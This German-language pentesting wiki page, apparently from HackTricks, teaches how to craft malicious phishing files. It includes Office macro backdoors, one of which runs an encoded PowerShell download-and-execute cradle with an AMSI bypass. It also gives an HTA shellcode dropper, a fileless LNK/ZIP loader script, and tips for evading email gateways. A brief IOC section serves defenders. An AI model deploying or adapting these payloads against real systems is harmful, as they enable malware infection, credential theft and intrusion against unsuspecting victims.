# Phishing-Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Datenvalidierung durch. Die Datenvalidierung erfolgt in Form der Identifikation von Datenstrukturen, anhand des OfficeOpenXML-Standards. Wenn während der Identifikation der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

Normalerweise verwenden Word-Dateien, die Makros enthalten, die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem man die Dateiendung ändert, und trotzdem die Fähigkeit zur Makroausführung beizubehalten.\
Zum Beispiel unterstützt eine RTF-Datei per Design keine Makros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und wäre zur Makroausführung fähig.\
Die gleichen Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint etc.).

Sie können den folgenden Befehl verwenden, um zu prüfen, welche Erweiterungen von einigen Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine entfernte Vorlage verweisen (File –Options –Add-ins –Manage: Templates –Go), die Makros enthält, können ebenfalls Makros „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Makro-Backdoor

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie verwendet werden, desto wahrscheinlicher ist es, dass die AV sie erkennt.

- AutoOpen()
- Document_Open()

#### Makro-Code-Beispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manuell Metadaten entfernen

Gehe zu **File > Info > Inspect Document > Inspect Document**, wodurch der Document Inspector geöffnet wird. Klicke **Inspect** und dann **Remove All** neben **Document Properties and Personal Information**.

#### Doc-Erweiterung

Wenn fertig, wähle das Dropdown **Save as type** und ändere das Format von **`.docx`** zu **Word 97-2003 `.doc`**.\
Mach das, weil du **keine macros in einer `.docx`** speichern kannst und es ein **Stigma** gegenüber der macro-enabled **`.docm`** Erweiterung gibt (z. B. hat das Thumbnail-Icon ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **legacy `.doc` Erweiterung der beste Kompromiss**.

#### Generatoren für bösartige macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Sie erzeugt die Benutzeroberfläche und wird als "fully trusted" Anwendung ausgeführt, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installiert** wird, wodurch **`mshta` abhängig von IE** ist. Wenn dieser also deinstalliert wurde, können HTAs nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-Authentifizierung erzwingen

Es gibt mehrere Wege, **NTLM authentication "remotely" zu erzwingen**, zum Beispiel könntest du **unsichtbare Bilder** in E-Mails oder HTML einfügen, die der Benutzer aufruft (auch HTTP MitM?). Oder dem Opfer die **Adresse von Dateien** schicken, die allein durch **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Prüfe diese Ideen und mehr auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen kannst, sondern auch **NTLM Relay attacks** durchführen kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hochwirksame Kampagnen liefern ein ZIP, das zwei legitime Lock-Dokumente (PDF/DOCX) und eine bösartige .lnk enthält. Der Trick ist, dass der eigentliche PowerShell-Loader in den rohen Bytes der ZIP nach einem eindeutigen Marker gespeichert ist und die .lnk ihn vollständig im Speicher ausschneidet und ausführt.

Typischer Ablauf, implementiert durch den .lnk PowerShell-One-Liner:

1) Finde die ursprüngliche ZIP in üblichen Pfaden: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und dem Parent des aktuellen Working Directory.  
2) Lese die ZIP-Bytes und finde einen hartcodierten Marker (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell-Payload.  
3) Kopiere die ZIP nach %ProgramData%, entpacke sie dort und öffne die Lock-.docx, um legitim zu wirken.  
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Die nächste Stufe deobfuskieren (z. B. alle # Zeichen entfernen) und sie im Speicher ausführen.

Beispiel eines PowerShell-Skeletts, um die eingebettete Stufe zu extrahieren und auszuführen:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Die Auslieferung missbraucht oft vertrauenswürdige PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads filtern (liefert harmlose ZIPs basierend auf IP/UA).
- Die nächste Stufe entschlüsselt häufig base64/XOR shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Festplattenartefakte zu minimieren.

Persistence used in the same chain
- COM TypeLib hijacking des Microsoft Web Browser control, sodass IE/Explorer oder jede App, die ihn einbettet, die payload automatisch erneut startet. Siehe Details und einsatzbereite Befehle hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die den ASCII-Marker-String (z. B. xFIQCV) an die Archivdaten angehängt enthalten.
- .lnk, das übergeordnete/Benutzerordner durchsucht, um das ZIP zu finden, und ein Köderdokument öffnet.
- AMSI-Manipulation via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang laufende Business-Threads, die mit Links enden, die unter vertrauenswürdigen PaaS-Domains gehostet sind.

## Windows-Dateien zum Stehlen von NTLM-Hashes

Siehe die Seite zu **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referenzen

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
